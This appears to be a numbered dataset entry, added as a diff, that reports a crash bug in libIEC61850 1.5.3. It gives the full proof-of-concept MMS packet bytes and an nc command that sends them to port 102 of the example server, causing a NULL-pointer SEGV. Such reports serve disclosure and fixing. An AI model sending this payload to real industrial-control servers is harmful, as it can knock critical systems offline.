@@ -1,0 +1,13 @@
+Number: 495
+
+Summarize:
+In libIEC61850 version 1.5.3, sending the provided proof-of-concept input to the `server_example_substitution` example causes a crash in `mmsServer_handleDeleteNamedVariableListRequest` in `src/mms/iso_mms/server/mms_named_variable_list_service.c`. The observed failure is an AddressSanitizer-reported SEGV caused by a READ from address `0x000000000008` in that function, after which the application aborts.
+
+Reproduce:
+1. Start the example server with `sudo ./server_example_substitution`.
+2. Create a file `poc` containing the provided proof-of-concept bytes: `0300 0040 02f0 8001 0001 0061 3330 3102 0100 a02c a02a 0202 00c4 ad24 8222 01a1 1fa0 1d30 1ba0 19a1 171a 0b54 454d 504c 4154 4552 4344 1a08 4c50 4844 3124 5354`.
+3. Send it to the server on port 102 with `cat poc | nc 0.0.0.0 102`.
+4. Expected result: the server prints `Using libIEC61850 version 1.5.3` and `Connection opened`, then AddressSanitizer reports `DEADLYSIGNAL` / `ERROR: AddressSanitizer: SEGV on unknown address 0x000000000008`, with the top frame in `mmsServer_handleDeleteNamedVariableListRequest` (`src/mms/iso_mms/server/mms_named_variable_list_service.c:157`), followed by `ABORTING`.
+
+Payload:
+03 00 00 40 02 f0 80 01 00 01 00 61 33 30 31 02 01 00 a0 2c a0 2a 02 02 00 c4 ad 24 82 22 01 a1 1f a0 1d 30 1b a0 19 a1 17 1a 0b 54 45 4d 50 4c 41 54 45 52 43 44 1a 08 4c 50 48 44 31 24 53 54
